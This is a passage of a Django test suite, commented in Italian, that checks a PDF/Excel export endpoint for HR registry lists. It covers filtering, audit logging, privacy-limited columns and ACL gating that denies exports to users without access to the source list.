"""Test dell'endpoint unico di export delle liste di anagrafica (PDF/Excel)."""
from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.db import connection
from django.test import RequestFactory, TestCase, override_settings
from django.urls import reverse

from anagrafica.acl_bootstrap import PERM_EXPORT
from anagrafica.exports import EXPORT_SPECS, ExportSpec, acl_gate
from anagrafica.models import (
    AreaAziendale,
    DipendenteAnagraficaAziendale,
    Mansione,
    QualificaSessione,
    Reparto,
    RuoloAziendale,
    RuoloOperativo,
    TipoQualifica,
)
from core.legacy_cache import bump_legacy_cache_version
from core.legacy_models import Permesso, Pulsante, UtenteLegacy
from core.models import (
    AuditLog,
    PermissionDefinition,
    Profile,
    RolePermissionGrant,
    RoutePermissionBinding,
    UserOnboarding,
)
# Riuso degli helper delle tabelle legacy (creazione/pulizia) già usati da core.
from core.test_acl_v2 import _clear_legacy_acl_tables, _ensure_legacy_acl_tables

XLSX_CT = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"

User = get_user_model()

MANSIONI_LIST_PATH = "/anagrafica/mansioni/"


class ExportEndpointTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.admin = User.objects.create_superuser("admin_export", "admin@example.invalid", "x")
        # NB: LIVELLO_RISCHIO_CHOICES reali = B/M/A (non ALTO/BASSO come nel brief).
        Mansione.objects.create(
            nome="Addetto verniciatura",
            livello_rischio=Mansione.RISCHIO_ALTO,
            categoria=Mansione.CAT_OPERAIO,
            descrizione="Cabina di verniciatura",
        )
        Mansione.objects.create(
            nome="Impiegato ufficio",
            livello_rischio=Mansione.RISCHIO_BASSO,
            categoria=Mansione.CAT_IMPIEGATO,
        )

    def _url(self, key, **params):
        url = reverse("anagrafica:export", args=[key])
        if params:
            url += "?" + "&".join(f"{k}={v}" for k, v in params.items())
        return url

    def test_xlsx_export_returns_spreadsheet(self):
        self.client.force_login(self.admin)
        resp = self.client.get(self._url("mansioni", format="xlsx"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], XLSX_CT)
        self.assertIn("mansioni", resp["Content-Disposition"])

    def test_pdf_export_returns_pdf(self):
        self.client.force_login(self.admin)
        resp = self.client.get(self._url("mansioni", format="pdf"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], "application/pdf")
        self.assertTrue(resp.content.startswith(b"%PDF"))

    def test_filtered_scope_respects_querystring(self):
        self.client.force_login(self.admin)
        resp = self.client.get(
            self._url("mansioni", format="xlsx", scope="filtered", q="verniciatura")
        )
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("n_righe"), 1)
        self.assertEqual(log.dettaglio.get("scope"), "filtered")
        self.assertIn("verniciatura", log.dettaglio.get("filtri", ""))

    def test_filtered_scope_respects_rischio(self):
        self.client.force_login(self.admin)
        resp = self.client.get(self._url("mansioni", format="xlsx", rischio="A"))
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("n_righe"), 1)

    def test_full_scope_ignores_querystring(self):
        self.client.force_login(self.admin)
        resp = self.client.get(
            self._url("mansioni", format="xlsx", scope="full", q="verniciatura")
        )
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("n_righe"), 2)
        self.assertEqual(log.dettaglio.get("scope"), "full")

    def test_audit_row_written(self):
        self.client.force_login(self.admin)
        self.client.get(self._url("mansioni", format="pdf"))
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.modulo, "anagrafica")
        self.assertEqual(log.dettaglio.get("lista"), "mansioni")
        self.assertEqual(log.dettaglio.get("formato"), "pdf")

    def test_unknown_key_is_404(self):
        self.client.force_login(self.admin)
        resp = self.client.get(self._url("non-esiste", format="xlsx"))
        self.assertEqual(resp.status_code, 404)

    def test_anonymous_is_redirected_to_login(self):
        resp = self.client.get(self._url("mansioni", format="xlsx"))
        self.assertIn(resp.status_code, (302, 403))


class ExportSpecRegistryTests(TestCase):
    def test_permission_gate_is_mandatory_on_every_spec(self):
        """Fail-closed: nessuna spec può essere registrata senza gate ACL."""
        with self.assertRaises(TypeError):
            ExportSpec(  # type: ignore[call-arg]
                key="senza_gate",
                title="Senza gate",
                columns=[("A", "a")],
                dataset=lambda request, scope: [],
            )
        for key, spec in EXPORT_SPECS.items():
            self.assertTrue(callable(spec.permission), f"spec '{key}' senza gate ACL")

    @override_settings(LEGACY_AUTH_ENABLED=True)
    def test_every_spec_gate_denies_user_without_legacy_binding(self):
        """Il gate di ogni spec nega di default (utente senza utente legacy)."""
        request = RequestFactory().get("/anagrafica/esporta/mansioni/")
        request.user = User.objects.create_user("no_legacy", "n@example.invalid", "x")
        for key, spec in EXPORT_SPECS.items():
            self.assertFalse(spec.permission(request), f"spec '{key}' fail-open")

    def test_mansioni_dataset_fills_every_declared_column(self):
        """Le colonne dichiarate esistono davvero nelle righe prodotte dal dataset."""
        Mansione.objects.create(
            nome="Saldatore",
            livello_rischio=Mansione.RISCHIO_ALTO,
            categoria=Mansione.CAT_OPERAIO,
        )
        spec = EXPORT_SPECS["mansioni"]
        request = RequestFactory().get("/anagrafica/esporta/mansioni/")
        rows = spec.dataset(request, "full")
        self.assertTrue(rows)
        accessors = {accessor for _label, accessor in spec.columns}
        for row in rows:
            self.assertEqual(accessors - set(row), set())


@override_settings(LEGACY_AUTH_ENABLED=True, SECURE_SSL_REDIRECT=False)
class ExportAclGateTests(TestCase):
    """L'export non deve essere più permissivo della pagina elenco di origine."""

    def setUp(self):
        _ensure_legacy_acl_tables()
        _clear_legacy_acl_tables()
        cache.clear()
        with connection.cursor() as cursor:
            cursor.execute("INSERT INTO ruoli (id, nome) VALUES (6, 'utente')")

        self.user = User.objects.create_user("export_acl", "e@example.invalid", "x")
        self.legacy_user = UtenteLegacy.objects.create(
            nome="Tizio Test",
            email="tizio@example.invalid",
            password="x",
            ruolo="utente",
            ruolo_id=6,
            attivo=True,
            deve_cambiare_password=False,
        )
        Profile.objects.create(
            user=self.user,
            legacy_user_id=self.legacy_user.id,
            legacy_ruolo_id=6,
            legacy_ruolo="utente",
        )
        UserOnboarding.objects.create(user=self.user, completed=True)

        Mansione.objects.create(nome="Addetto verniciatura", livello_rischio=Mansione.RISCHIO_ALTO)

        # Binding canonico dell'endpoint di export (come da acl_bootstrap): il
        # middleware lascia passare la request, la decisione fine è del gate spec.
        PermissionDefinition.objects.create(
            code=PERM_EXPORT, module="anagrafica", label="Export liste", is_active=True
        )
        RoutePermissionBinding.objects.create(
            route_name="anagrafica:export",
            path_pattern="",
            match_strategy=RoutePermissionBinding.MATCH_EXACT,
            permission_id=PERM_EXPORT,
            source_app="anagrafica",
            is_active=True,
        )
        RolePermissionGrant.objects.create(
            legacy_role_id=6, permission_id=PERM_EXPORT, enabled=True
        )
        self.client.force_login(self.user)

    # -- helper -------------------------------------------------------------
    def _grant_list_via_legacy(self, allowed: bool = True):
        """Concede/nega la lista mansioni via ACL legacy (nessun binding canonico)."""
        Pulsante.objects.create(
            codice="anagrafica_mansioni",
            nome_visibile="Mansioni",
            modulo="anagrafica",
            url=MANSIONI_LIST_PATH,
        )
        Permesso.objects.create(
            ruolo_id=6,
            modulo="anagrafica",
            azione="anagrafica_mansioni",
            consentito=1 if allowed else 0,
            can_view=1 if allowed else 0,
        )
        cache.clear()
        bump_legacy_cache_version()

    def _grant_list_via_canonical(self, enabled: bool = True):
        """Concede/nega la lista mansioni via binding canonico ACL v2."""
        PermissionDefinition.objects.create(
            code="anagrafica.mansioni.view",
            module="anagrafica",
            label="Mansioni - Visualizza",
            is_active=True,
        )
        RoutePermissionBinding.objects.create(
            route_name="anagrafica:mansioni_list",
            path_pattern="",
            match_strategy=RoutePermissionBinding.MATCH_EXACT,
            permission_id="anagrafica.mansioni.view",
            source_app="anagrafica",
            is_active=True,
        )
        RolePermissionGrant.objects.create(
            legacy_role_id=6, permission_id="anagrafica.mansioni.view", enabled=enabled
        )
        cache.clear()
        bump_legacy_cache_version()

    def _export(self):
        return self.client.get(reverse("anagrafica:export", args=["mansioni"]) + "?format=xlsx")

    # -- test ---------------------------------------------------------------
    def test_export_denied_when_user_cannot_open_the_list(self):
        # Nessun permesso sulla lista (né canonico né legacy) → export negato.
        resp = self._export()
        self.assertEqual(resp.status_code, 403)

    def test_export_denied_when_legacy_permission_explicitly_denies_the_list(self):
        self._grant_list_via_legacy(allowed=False)
        resp = self._export()
        self.assertEqual(resp.status_code, 403)

    def test_export_denied_for_every_support_key_without_permission(self):
        """Le 5 chiavi delle anagrafiche di supporto (Task 6: aree, ruoli_aziendali,
        ruoli_operativi, qualifiche, qualifica_sessioni) devono negare l'export a un
        utente autenticato senza alcun binding ACL sulla lista di origine — end-to-end
        via ``self.client`` (dispatch reale dell'endpoint), non solo la funzione di
        gate isolata (vedi ``ExportSpecRegistryTests.test_every_spec_gate_denies_user_without_legacy_binding``
        che copre lo stesso invariante ma senza passare da URL/view)."""
        support_keys = (
            "aree", "ruoli_aziendali", "ruoli_operativi", "qualifiche", "qualifica_sessioni",
        )
        for key in support_keys:
            with self.subTest(key=key):
                resp = self.client.get(reverse("anagrafica:export", args=[key]) + "?format=xlsx")
                self.assertEqual(resp.status_code, 403)

    def test_export_denied_for_every_formazione_key_without_permission(self):
        """Le 7 chiavi di formazione (Task 7) negano l'export a un utente
        autenticato senza binding ACL sulla lista di origine — end-to-end."""
        formazione_keys = (
            "formazione_piani", "formazione_corsi", "formazione_istruttori",
            "formazione_sessioni", "fattori_rischio", "categorie_corso",
            "esposizioni_rischio",
        )
        for key in formazione_keys:
            with self.subTest(key=key):
                resp = self.client.get(reverse("anagrafica:export", args=[key]) + "?format=xlsx")
                self.assertEqual(resp.status_code, 403)

    def test_export_denied_for_every_hr_key_without_permission(self):
        """Le 4 chiavi HR/documenti (Task 8) negano l'export a un utente
        autenticato senza binding ACL sulla lista di origine — end-to-end."""
        for key in ("ex_dipendenti", "documenti", "onboarding", "ratei"):
            with self.subTest(key=key):
                resp = self.client.get(reverse("anagrafica:export", args=[key]) + "?format=xlsx")
                self.assertEqual(resp.status_code, 403)

    def test_export_allowed_when_user_can_open_the_list(self):
        self._grant_list_via_legacy(allowed=True)
        resp = self._export()
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], XLSX_CT)

    def test_export_allowed_with_canonical_binding_on_the_list(self):
        self._grant_list_via_canonical(enabled=True)
        resp = self._export()
        self.assertEqual(resp.status_code, 200)

    def test_export_denied_when_canonical_binding_on_the_list_denies(self):
        self._grant_list_via_canonical(enabled=False)
        resp = self._export()
        self.assertEqual(resp.status_code, 403)

    @override_settings(ACL_STRICT_CANONICAL=True)
    def test_strict_mode_denies_export_when_list_has_no_canonical_binding(self):
        """Invariante C1: in strict-mode il middleware nega la lista (fallback
        legacy) → l'export non può essere una porta di servizio."""
        self._grant_list_via_legacy(allowed=True)
        # La pagina elenco, in strict-mode, è negata dal middleware.
        page = self.client.get(MANSIONI_LIST_PATH)
        self.assertEqual(page.status_code, 403)
        # …e l'export deve seguire la stessa sorte.
        resp = self._export()
        self.assertEqual(resp.status_code, 403)

    @override_settings(ACL_STRICT_CANONICAL=True)
    def test_strict_mode_allows_export_when_list_has_canonical_binding(self):
        self._grant_list_via_canonical(enabled=True)
        self.assertEqual(self.client.get(MANSIONI_LIST_PATH).status_code, 200)
        self.assertEqual(self._export().status_code, 200)


class ExportMenuTemplateTests(TestCase):
    """Componente UI «Esporta ▾» nella toolbar della lista mansioni.

    NB rispetto al brief: l'URL atteso è costruito con ``reverse()`` (come fa
    il componente via ``{% url %}``), non concatenando stringhe a mano — il
    componente non deve mai divergere dal path reale dichiarato in urls.py.
    """

    @classmethod
    def setUpTestData(cls):
        cls.admin = User.objects.create_superuser("admin_menu", "admin2@example.invalid", "x")
        cls.export_base = reverse("anagrafica:export", args=["mansioni"])

    def test_mansioni_list_shows_export_menu_with_no_querystring(self):
        self.client.force_login(self.admin)
        resp = self.client.get(reverse("anagrafica:mansioni_list"))
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        self.assertIn("Esporta", html)
        # Senza querystring, i link "filtrato" non hanno un "&amp;" a vuoto in coda.
        self.assertIn(f'{self.export_base}?format=xlsx&amp;scope=filtered"', html)
        self.assertIn(f'{self.export_base}?format=pdf&amp;scope=filtered"', html)
        self.assertIn(f'{self.export_base}?format=xlsx&amp;scope=full"', html)
        self.assertIn(f'{self.export_base}?format=pdf&amp;scope=full"', html)

    def test_filtered_links_propagate_current_querystring_html_escaped(self):
        self.client.force_login(self.admin)
        resp = self.client.get(reverse("anagrafica:mansioni_list") + "?q=vernic&rischio=A")
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        # La querystring corrente va propagata SOLO sui link "filtrato", con
        # '&' correttamente escapato come '&amp;' (HTML valido).
        self.assertIn(
            f'{self.export_base}?format=xlsx&amp;scope=filtered&amp;q=vernic&amp;rischio=A"',
            html,
        )
        self.assertIn(
            f'{self.export_base}?format=pdf&amp;scope=filtered&amp;q=vernic&amp;rischio=A"',
            html,
        )
        # I link "tutto" restano invariati (nessuna propagazione della querystring).
        self.assertIn(f'{self.export_base}?format=xlsx&amp;scope=full"', html)
        self.assertIn(f'{self.export_base}?format=pdf&amp;scope=full"', html)
        self.assertNotIn(
            f'{self.export_base}?format=xlsx&amp;scope=full&amp;q=vernic', html
        )


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class DipendentiExportTests(TestCase):
    """Export della lista dipendenti.

    L'anagrafica vive sul DB legacy: qui la tabella è creata e popolata con
    dati **sintetici** (nessun dato reale). I test verificano la coerenza
    view↔export (stesso helper), il perimetro delle colonne (privacy: solo
    ciò che è già a schermo) e il funzionamento dell'endpoint.
    """

    def setUp(self):
        # Helper già usato dai test della lista: crea la tabella legacy.
        from anagrafica.tests import _ensure_anagrafica_table

        _ensure_anagrafica_table()
        with connection.cursor() as cursor:
            cursor.execute("DELETE FROM anagrafica_dipendenti")
            for alias, nome, cognome, reparto, mansione, email in (
                ("m.rossi", "Mario", "Rossi", "Officina", "Saldatore", "m.rossi@example.invalid"),
                ("l.bianchi", "Luca", "Bianchi", "Ufficio", "Impiegato", "l.bianchi@example.invalid"),
                ("a.verdi", "Anna", "Verdi", "Officina", "Verniciatore", "a.verdi@example.invalid"),
                ("c.cessato", "Carlo", "Cessato", "Officina", "Saldatore", "c.cessato@example.invalid"),
            ):
                cursor.execute(
                    """
                    INSERT INTO anagrafica_dipendenti
                        (aliasusername, nome, cognome, reparto, mansione, email_notifica, attivo)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                    """,
                    [alias, nome, cognome, reparto, mansione, email, 1],
                )
            cursor.execute(
                "SELECT id FROM anagrafica_dipendenti WHERE aliasusername = %s", ["c.cessato"]
            )
            cessato_id = int(cursor.fetchone()[0])
        DipendenteAnagraficaAziendale.objects.create(
            legacy_anagrafica_id=cessato_id, data_cessazione="2020-01-31"
        )
        self.admin = User.objects.create_superuser("admin_dip", "admin3@example.invalid", "x")
        self.client.force_login(self.admin)

    def _request(self, querystring: str = ""):
        request = RequestFactory().get(f"/anagrafica/dipendenti/{querystring}")
        request.user = self.admin
        return request

    def test_dipendenti_export_xlsx_ok_and_audited(self):
        url = reverse("anagrafica:export", args=["dipendenti"]) + "?format=xlsx&scope=filtered&reparto=Officina"
        resp = self.client.get(url)
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], XLSX_CT)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("lista"), "dipendenti")
        self.assertIn("Officina", log.dettaglio.get("filtri", ""))
        # Rossi + Verdi: il cessato (Officina) resta fuori dalla lista in forza.
        self.assertEqual(log.dettaglio.get("n_righe"), 2)

    def test_dipendenti_export_pdf(self):
        resp = self.client.get(
            reverse("anagrafica:export", args=["dipendenti"]) + "?format=pdf"
        )
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp["Content-Type"], "application/pdf")
        self.assertTrue(resp.content.startswith(b"%PDF"))

    def test_export_dataset_matches_view_helper(self):
        """Fonte unica: export e view producono lo stesso insieme di righe."""
        from anagrafica.views import build_dipendenti_rows

        for querystring in ("", "?q=ross", "?reparto=Officina", "?q=zzz-nessuno"):
            with self.subTest(querystring=querystring):
                request = self._request(querystring)
                view_rows = build_dipendenti_rows(request, apply_filters=True)
                export_rows = EXPORT_SPECS["dipendenti"].dataset(request, "filtered")
                self.assertEqual(len(view_rows), len(export_rows))
                self.assertEqual(
                    [str(r.get("cognome") or "") for r in view_rows],
                    [r["cognome"] for r in export_rows],
                )

    def test_export_matches_rows_actually_rendered_by_the_page(self):
        """Chiude il buco anti-drift: confronta le righe DAVVERO renderizzate
        dalla pagina (``resp.context["page_obj"]``) con quelle dell'export,
        non l'helper con se stesso (che passerebbe anche se la view smettesse
        di richiamare ``build_dipendenti_rows``)."""
        for querystring in ("", "?q=ross", "?reparto=Officina"):
            with self.subTest(querystring=querystring):
                resp = self.client.get(reverse("anagrafica:dipendenti_list") + querystring)
                self.assertEqual(resp.status_code, 200)
                page_ids = [int(row.get("id") or 0) for row in resp.context["page_obj"].object_list]

                export_rows = EXPORT_SPECS["dipendenti"].dataset(self._request(querystring), "filtered")
                export_ids = [int(r["id"]) for r in export_rows]

                self.assertEqual(page_ids, export_ids)

    def test_full_scope_ignores_querystring(self):
        request = self._request("?reparto=Officina")
        rows = EXPORT_SPECS["dipendenti"].dataset(request, "full")
        self.assertEqual(len(rows), 3)

    def test_cessati_are_never_exported(self):
        request = self._request()
        rows = EXPORT_SPECS["dipendenti"].dataset(request, "full")
        self.assertNotIn("Cessato", [r["cognome"] for r in rows])

    def test_columns_are_filled_and_limited_to_what_the_page_shows(self):
        """Privacy: nessuna colonna oltre a quelle già visibili nella lista."""
        spec = EXPORT_SPECS["dipendenti"]
        self.assertEqual(
            [accessor for _label, accessor in spec.columns],
            ["id", "cognome", "nome", "reparto", "mansione", "email_notifica"],
        )
        rows = spec.dataset(self._request(), "full")
        self.assertTrue(rows)
        accessors = {accessor for _label, accessor in spec.columns}
        for row in rows:
            self.assertEqual(accessors - set(row), set())

    def test_view_context_is_unchanged_by_the_extraction(self):
        """Non-regressione: `n_totale`/`reparti` restano pre-filtro."""
        resp = self.client.get(reverse("anagrafica:dipendenti_list") + "?reparto=Officina")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.context["n_totale"], 3)          # pre-filtro (senza cessati)
        self.assertEqual(resp.context["reparti"], ["Officina", "Ufficio"])
        self.assertEqual(resp.context["n_ex"], 1)
        self.assertEqual(resp.context["page_obj"].paginator.count, 2)  # filtrati

    def test_dipendenti_list_shows_export_menu(self):
        resp = self.client.get(reverse("anagrafica:dipendenti_list") + "?q=ross")
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        base = reverse("anagrafica:export", args=["dipendenti"])
        self.assertIn("Esporta", html)
        self.assertIn(f'{base}?format=xlsx&amp;scope=filtered&amp;q=ross"', html)
        self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AnagraficheSupportoExportTests(TestCase):
    """Export delle anagrafiche di supporto (Task 6).

    Chiavi: `aree` (lista annidata → appiattita), `ruoli_aziendali`,
    `ruoli_operativi`, `qualifiche`, `qualifica_sessioni`.
    Dati **sintetici**: nessun dato reale (l'anagrafica legacy è ricreata
    dall'helper dei test della lista dipendenti).
    """

    SUPPORT_KEYS = ("aree", "ruoli_aziendali", "ruoli_operativi", "qualifiche", "qualifica_sessioni")

    def setUp(self):
        from anagrafica.tests import _ensure_anagrafica_table

        _ensure_anagrafica_table()
        with connection.cursor() as cursor:
            cursor.execute("DELETE FROM anagrafica_dipendenti")
            for alias, nome, cognome in (
                ("m.rossi", "Mario", "Rossi"),
                ("l.bianchi", "Luca", "Bianchi"),
            ):
                cursor.execute(
                    """
                    INSERT INTO anagrafica_dipendenti
                        (aliasusername, nome, cognome, reparto, mansione, attivo)
                    VALUES (%s, %s, %s, %s, %s, %s)
                    """,
                    [alias, nome, cognome, "Officina", "Saldatore", 1],
                )
            cursor.execute(
                "SELECT id FROM anagrafica_dipendenti WHERE aliasusername = %s", ["m.rossi"]
            )
            self.capo_id = int(cursor.fetchone()[0])
            cursor.execute(
                "SELECT id FROM anagrafica_dipendenti WHERE aliasusername = %s", ["l.bianchi"]
            )
            self.resp_id = int(cursor.fetchone()[0])

        # Aree & reparti: 1 reparto con 2 aree, 1 reparto senza aree, 1 area orfana.
        self.officina = Reparto.objects.create(nome="Officina", caporeparto_legacy_id=self.capo_id)
        Reparto.objects.create(nome="Zeta senza aree")
        AreaAziendale.objects.create(
            nome="IN1", reparto=self.officina, responsabile_legacy_id=self.resp_id
        )
        AreaAziendale.objects.create(
            nome="IN2", reparto=self.officina, descrizione="Linea 2", is_active=False
        )
        AreaAziendale.objects.create(nome="Orfana")

        RuoloAziendale.objects.create(nome="Capoturno", descrizione="Turno notte")
        RuoloAziendale.objects.create(nome="Responsabile di reparto", is_active=False)

        RuoloOperativo.objects.create(nome="Preposto", descrizione="D.Lgs 81/08")
        RuoloOperativo.objects.create(nome="RSPP", is_active=False)

        self.t_sic = TipoQualifica.objects.create(
            nome="Primo soccorso", categoria=TipoQualifica.CAT_SICUREZZA, durata_mesi=36
        )
        TipoQualifica.objects.create(
            nome="Antincendio", categoria=TipoQualifica.CAT_SICUREZZA, durata_mesi=60
        )
        self.t_prof = TipoQualifica.objects.create(
            nome="Patentino carrellista",
            categoria=TipoQualifica.CAT_PROFESSIONALE,
            durata_mesi=0,
        )

        QualificaSessione.objects.create(
            tipo=self.t_sic, data_conseguimento="2026-01-15", ente="Ente Alfa"
        )
        QualificaSessione.objects.create(
            tipo=self.t_prof, data_conseguimento="2026-02-20", ente="Ente Beta"
        )

        self.admin = User.objects.create_superuser("admin_sup", "sup@example.invalid", "x")
        self.client.force_login(self.admin)

    def _request(self, path: str = "/anagrafica/aree/"):
        request = RequestFactory().get(path)
        request.user = self.admin
        return request

    def _export_url(self, key: str, **params) -> str:
        url = reverse("anagrafica:export", args=[key])
        return url + "?" + "&".join(f"{k}={v}" for k, v in params.items())

    # -- endpoint -----------------------------------------------------------
    def test_every_support_key_is_registered(self):
        for key in self.SUPPORT_KEYS:
            self.assertIn(key, EXPORT_SPECS)

    def test_xlsx_export_ok_for_every_support_key(self):
        for key in self.SUPPORT_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="xlsx"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], XLSX_CT)
                self.assertIn(key, resp["Content-Disposition"])

    def test_pdf_export_ok_for_every_support_key(self):
        for key in self.SUPPORT_KEYS:
            with self.subTest(key=key):
                resp = self.client.get(self._export_url(key, format="pdf"))
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp["Content-Type"], "application/pdf")
                self.assertTrue(resp.content.startswith(b"%PDF"))

    def test_audit_written_with_the_right_key(self):
        for key in self.SUPPORT_KEYS:
            with self.subTest(key=key):
                self.client.get(self._export_url(key, format="xlsx"))
                log = AuditLog.objects.filter(azione="export").latest("id")
                self.assertEqual(log.modulo, "anagrafica")
                self.assertEqual(log.dettaglio.get("lista"), key)

    def test_columns_are_filled_by_every_dataset(self):
        for key in self.SUPPORT_KEYS:
            with self.subTest(key=key):
                spec = EXPORT_SPECS[key]
                rows = spec.dataset(self._request(), "full")
                self.assertTrue(rows)
                accessors = {accessor for _label, accessor in spec.columns}
                for row in rows:
                    self.assertEqual(accessors - set(row), set())

    # -- aree: lista annidata appiattita ------------------------------------
    def test_aree_rows_are_flattened_with_reparto_repeated(self):
        rows = EXPORT_SPECS["aree"].dataset(self._request(), "full")
        officina = [r for r in rows if r["reparto"] == "Officina"]
        self.assertEqual([r["area"] for r in officina], ["IN1", "IN2"])
        # Colonna «Reparto» ripetuta su ogni riga area + caporeparto risolto.
        self.assertEqual({r["caporeparto"] for r in officina}, {"Rossi Mario"})
        self.assertEqual(officina[0]["responsabile"], "Bianchi Luca")
        self.assertEqual(officina[1]["stato"], "Inattivo")
        # Area senza reparto inclusa, con reparto vuoto.
        orfana = next(r for r in rows if r["area"] == "Orfana")
        self.assertEqual(orfana["reparto"], "")
        # Il reparto senza aree resta visibile (come a schermo), con area vuota.
        vuoto = next(r for r in rows if r["reparto"] == "Zeta senza aree")
        self.assertEqual(vuoto["area"], "")

    # -- scope filtered vs full ---------------------------------------------
    def test_qualifiche_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["qualifiche"]
        request = self._request("/anagrafica/qualifiche/?categoria=SICUREZZA")
        self.assertEqual(len(spec.dataset(request, "full")), 3)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual(len(filtered), 2)
        self.assertEqual({r["categoria"] for r in filtered}, {"Sicurezza"})
        self.assertIn("Sicurezza", spec.filters_label(request))

    def test_qualifiche_durata_column_mirrors_the_page(self):
        rows = EXPORT_SPECS["qualifiche"].dataset(self._request(), "full")
        by_name = {r["nome"]: r for r in rows}
        self.assertEqual(by_name["Primo soccorso"]["durata"], "36 mesi")
        self.assertEqual(by_name["Patentino carrellista"]["durata"], "Nessuna scadenza")

    def test_qualifica_sessioni_filtered_scope_reduces_rows(self):
        spec = EXPORT_SPECS["qualifica_sessioni"]
        request = self._request("/anagrafica/qualifiche/sessioni/?q=Alfa")
        self.assertEqual(len(spec.dataset(request, "full")), 2)
        filtered = spec.dataset(request, "filtered")
        self.assertEqual(len(filtered), 1)
        self.assertEqual(filtered[0]["ente"], "Ente Alfa")
        self.assertEqual(filtered[0]["data"], "15-01-2026")
        # 36 mesi dal conseguimento → scadenza calcolata (come mostra la pagina).
        self.assertEqual(filtered[0]["scadenza"], "15-01-2029")

    def test_qualifica_sessioni_tipo_filter_matches_the_view(self):
        from anagrafica.views import build_qualifica_sessioni_rows

        request = self._request(f"/anagrafica/qualifiche/sessioni/?tipo={self.t_prof.id}")
        view_rows = build_qualifica_sessioni_rows(request, apply_filters=True)
        export_rows = EXPORT_SPECS["qualifica_sessioni"].dataset(request, "filtered")
        self.assertEqual(len(view_rows), 1)
        self.assertEqual([s.tipo.nome for s in view_rows], [r["qualifica"] for r in export_rows])
        self.assertIn("Patentino carrellista", EXPORT_SPECS["qualifica_sessioni"].filters_label(request))

    def test_qualifica_sessioni_full_scope_ignores_querystring_via_endpoint(self):
        resp = self.client.get(
            self._export_url("qualifica_sessioni", format="xlsx", scope="full", q="Alfa")
        )
        self.assertEqual(resp.status_code, 200)
        log = AuditLog.objects.filter(azione="export").latest("id")
        self.assertEqual(log.dettaglio.get("n_righe"), 2)

    # -- UI: menu export nella toolbar --------------------------------------
    def test_support_pages_show_the_export_menu(self):
        pages = {
            "aree": "anagrafica:aree_list",
            "ruoli_aziendali": "anagrafica:ruoli_aziendali_list",
            "ruoli_operativi": "anagrafica:ruoli_operativi_list",
            "qualifiche": "anagrafica:qualifiche_list",
            "qualifica_sessioni": "anagrafica:qualifica_sessioni_list",
        }
        for key, route in pages.items():
            with self.subTest(key=key):
                resp = self.client.get(reverse(route))
                self.assertEqual(resp.status_code, 200)
                html = resp.content.decode()
                base = reverse("anagrafica:export", args=[key])
                self.assertIn("Esporta", html)
                self.assertIn(f'{base}?format=xlsx&amp;scope=filtered"', html)
                self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)

    def test_qualifica_sessioni_page_propagates_querystring_on_filtered_links(self):
        resp = self.client.get(reverse("anagrafica:qualifica_sessioni_list") + "?q=Alfa")
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        base = reverse("anagrafica:export", args=["qualifica_sessioni"])
        self.assertIn(f'{base}?format=xlsx&amp;scope=filtered&amp;q=Alfa"', html)
        self.assertIn(f'{base}?format=pdf&amp;scope=full"', html)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class FormazioneExportTests(TestCase):
    """Export delle liste di FORMAZIONE (Task 7).

    Chiavi: `formazione_piani`, `formazione_corsi`, `formazione_istruttori`,
    `formazione_sessioni`, `fattori_rischio`, `categorie_corso`,
    `esposizioni_rischio`.

    Dati **sintetici** (nessun dato reale). Per le due liste con filtri non
    banali (corsi, sessioni) i test legano l'export alle righe DAVVERO
    renderizzate dalla pagina, non solo all'helper con se stesso.
    """

    FORMAZIONE_KEYS = (
        "formazione_piani",
        "formazione_corsi",
        "formazione_istruttori",
        "formazione_sessioni",
        "fattori_rischio",
        "categorie_corso",
        "esposizioni_rischio",
    )

    @classmethod
    def setUpTestData(cls):
        from anagrafica.models import (
            CategoriaCorso,
            EsposizioneRischio,
            FattoreRischio,
            TrainingCourse,
            TrainingInstructor,
            TrainingPlan,
            TrainingSession,
        )

        cls.piano_sic = TrainingPlan.objects.create(
            codice="SIC", nome="Sicurezza", categoria="OBBLIGATORIA", stato="ATTIVO",
            provider_esterno=True,
        )
        cls.piano_it = TrainingPlan.objects.create(
            codice="IT", nome="Informatica", categoria="CONSIGLIATA", stato="BOZZA",
        )

        cls.corso_anti = TrainingCourse.objects.create(
            piano=cls.piano_sic, codice="ANTINC", titolo="Antincendio base",
            durata_ore_teorica=8, validita_mesi=36, obbligatorio=True, stato="ATTIVO",
        )
        cls.corso_excel = TrainingCourse.objects.create(
            piano=cls.piano_it, codice="EXCEL", titolo="Excel avanzato",
            durata_ore_teorica=16, validita_mesi=0, obbligatorio=False, stato="BOZZA",
        )

        cls.docente_int = TrainingInstructor.objects.create(
